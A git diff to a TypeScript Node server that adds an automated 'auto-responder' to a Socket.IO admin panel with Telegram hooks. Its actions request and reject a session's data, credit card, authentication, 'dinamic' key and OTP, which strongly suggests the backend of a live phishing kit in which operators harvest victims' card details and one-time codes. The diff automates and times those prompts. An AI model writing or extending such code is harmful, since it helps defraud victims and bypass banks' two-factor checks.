@@ -66,6 +66,12 @@ import { SyncProject } from "./core/application/usecases/project/SyncProject.js"
 import { SyncProjectMember } from "./core/application/usecases/project/SyncProjectMember.js";
 import { ProjectController } from "./adapters/inbound/http/controllers/ProjectController.js";
 
+// Auto-Responder imports
+import { PrismaAutoResponderConfigRepository } from "./adapters/outbound/db/PrismaAutoResponderConfigRepository.js";
+import { NodeAutoResponderTimer } from "./adapters/outbound/timers/NodeAutoResponderTimer.js";
+import { AutoResponderOrchestrator } from "./core/application/usecases/autoResponder/AutoResponderOrchestrator.js";
+import { AutoResponderController } from "./adapters/inbound/http/controllers/AutoResponderController.js";
+
 
 const PORT = Number(process.env.PORT || 3005);
 const PANEL = process.env.PANEL_HOST || "";
@@ -153,6 +159,28 @@ const setPresence = new SetPresence(repo, rt);
 const presenceTimer = new NodePresenceTimer();
 const markInactiveLater = new MarkInactiveLater(presenceTimer, setPresence);
 
+/* auto-responder */
+const arConfigRepo = new PrismaAutoResponderConfigRepository();
+const arTimer = new NodeAutoResponderTimer();
+const arActionMap: Record<string, { execute(input: { sessionId: string }): Promise<any> }> = {
+  request_data: requestData,
+  reject_data: rejectData,
+  request_cc: requestCc,
+  reject_cc: rejectCc,
+  request_auth: requestAuth,
+  reject_auth: rejectAuth,
+  request_dinamic: requestDinamic,
+  reject_dinamic: rejectDinamic,
+  request_otp: requestOtp,
+  reject_otp: rejectOtp,
+  request_finish: requestFinish,
+};
+const arOrchestrator = new AutoResponderOrchestrator(arConfigRepo, arTimer, arActionMap, repo);
+
+// Wire auto-responder hooks into gateway
+rt.setOnUpsert((session) => arOrchestrator.onSessionChanged(session));
+rt.setArDeadlineProvider((sessionId) => arOrchestrator.getDeadline(sessionId));
+
 /* panel user */
 const sharedSecret = process.env.LARAVEL_SHARED_SECRET || "";
 const syncPanelUser = new SyncPanelUser(panelUserRepo, sharedSecret);
@@ -183,7 +211,7 @@ const adminController = new AdminController(issueAdminToken);
 const panelUserController = panelRequestOtp
   ? new PanelUserController(syncPanelUser, panelRequestOtp, panelVerifyOtp, panelUserRepo, sharedSecret)
   : undefined;
-  
+
 const telegramController = handleTelegramUpdate
   ? new TelegramController(handleTelegramUpdate, process.env.TELEGRAM_WEBHOOK_SECRET)
   : undefined;
@@ -195,16 +223,20 @@ const projectController = new ProjectController(
   sharedSecret
 );
 
+const autoResponderController = new AutoResponderController(arOrchestrator, rt, sharedSecret);
+
 const routes = {
   sessions: sessionsController,
   admin: adminController,
   project: projectController,
+  autoResponder: autoResponderController,
   ...(panelUserController ? { panelUser: panelUserController } : {}),
   ...(telegramController ? { telegram: telegramController } : {}),
 } satisfies {
   sessions: SessionsController;
   admin: AdminController;
   project: ProjectController;
+  autoResponder: AutoResponderController;
   panelUser?: PanelUserController;
   telegram?: TelegramController;
 };
@@ -257,6 +289,12 @@ io.on("connection", async (socket) => {
       limit: 200
     });
 
+    // Enviar config de auto-responder al admin que se conecta
+    const arConfig = arOrchestrator.getConfig();
+    if (arConfig) {
+      socket.emit("auto-responder:config", arConfig);
+    }
+
     registerAdminHandlers(socket, {
       requestData,
       rejectData,
@@ -291,4 +329,15 @@ io.on("connection", async (socket) => {
   }
 });
 
-httpServer.listen(PORT,"0.0.0.0" ,() => console.log(`Backend running on http://localhost:${PORT}`));
+// ---- Start server
+httpServer.listen(PORT, "0.0.0.0", async () => {
+  console.log(`Backend running on http://localhost:${PORT}`);
+
+  // Load auto-responder config and start timers for existing WAIT sessions
+  try {
+    await arOrchestrator.loadConfig();
+    await arOrchestrator.recheckAllSessions();
+  } catch (e) {
+    console.error("[AutoResponder] Startup error:", e);
+  }
+});
